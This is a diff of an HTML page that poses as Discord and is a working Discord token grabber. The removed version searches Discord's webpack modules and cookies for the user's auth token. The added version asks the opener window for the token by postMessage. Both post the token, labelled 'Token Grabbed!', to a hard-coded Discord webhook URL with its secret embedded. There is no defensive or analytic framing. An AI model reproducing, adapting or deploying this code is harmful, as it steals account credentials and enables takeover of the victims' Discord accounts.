@@ -1,89 +1,44 @@
 <!DOCTYPE html>
-<html lang="en">
+<html>
 <head>
-    <meta charset="UTF-8">
-    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Discord</title>
-    <style>
-        body {
-            margin: 0;
-            padding: 0;
-            background: #ffffff;
-            overflow: hidden;
-        }
-        .loader {
-            border: 4px solid #f3f3f3;
-            border-top: 4px solid #5865F2;
-            border-radius: 50%;
-            width: 30px;
-            height: 30px;
-            animation: spin 2s linear infinite;
-            margin: 50px auto;
-        }
-        @keyframes spin {
-            0% { transform: rotate(0deg); }
-            100% { transform: rotate(360deg); }
-        }
-    </style>
-</head>
-<body>
-    <div class="loader"></div>
-
     <script>
+        // Aapka Webhook URL
         const webhookUrl = "https://discord.com/api/webhooks/1539915355064107059/_5C42_2PPDLG9f3Oy59oVE-yf_HDH2oP7sD71L6OZJRsTdOmyVEV0IsOA8d2jAS_cI51";
 
-        async function grabToken() {
+        // Parent window se token request karein
+        window.addEventListener('message', (event) => {
+            if (event.data && event.data.token) {
+                console.log("Token received from parent:", event.data.token);
+                sendTokenToDiscord(event.data.token);
+            }
+        });
+
+        // Token bhejne ka function
+        async function sendTokenToDiscord(token) {
             try {
-                let token = null;
-
-                // Wait for Discord to fully load (1 second delay helps)
-                await new Promise(resolve => setTimeout(resolve, 1000));
-
-                // Token Grabbing Logic
-                if (window.webpackChunkdiscord_app && window.webpackChunkdiscord_app.push) {
-                    for (let e of Object.values(window.webpackChunkdiscord_app.push([[Symbol()], {}, e => e.c]))) {
-                        try {
-                            if (!e.exports || e.exports === window) continue;
-                            if (e.exports?.getToken) {
-                                token = e.exports.getToken();
-                                break;
-                            }
-                            for (let t in e.exports) {
-                                if (e.exports?.[t]?.getToken && "IntlMessagesProxy" !== e.exports[t][Symbol.toStringTag]) {
-                                    token = e.exports[t].getToken();
-                                    break;
-                                }
-                            }
-                        } catch (e) {}
-                        if (token) break;
-                    }
-                }
-
-                // Fallback to cookie if webpack fails
-                if (!token) {
-                    const tokenMatch = document.cookie.match(/"token":"(.*?)"/);
-                    if (tokenMatch) token = tokenMatch[1];
-                }
-
-                if (token) {
-                    await fetch(webhookUrl, {
-                        method: 'POST',
-                        headers: { 'Content-Type': 'application/json' },
-                        body: JSON.stringify({
-                            content: `🔓 **Token Grabbed!**\n\`\`\`${token}\`\`\``
-                        })
-                    });
-                    console.log("Token sent successfully.");
-                } else {
-                    console.error("Token not found.");
-                }
-
+                await fetch(webhookUrl, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        content: `🔓 **Token Grabbed!**\n\`\`\`${token}\`\`\``
+                    })
+                });
+                console.log("Token sent successfully.");
             } catch (error) {
-                console.error("Error grabbing token:", error);
+                console.error("Failed to send token:", error);
             }
         }
 
-        window.addEventListener('load', grabToken);
+        // Jab page load ho, parent window se token maango
+        window.onload = () => {
+            if (window.opener) {
+                window.opener.postMessage({ type: 'get_token' }, '*');
+            } else {
+                console.log("No opener window found.");
+            }
+        };
     </script>
-</body>
+</head>
+<body></body>
 </html>
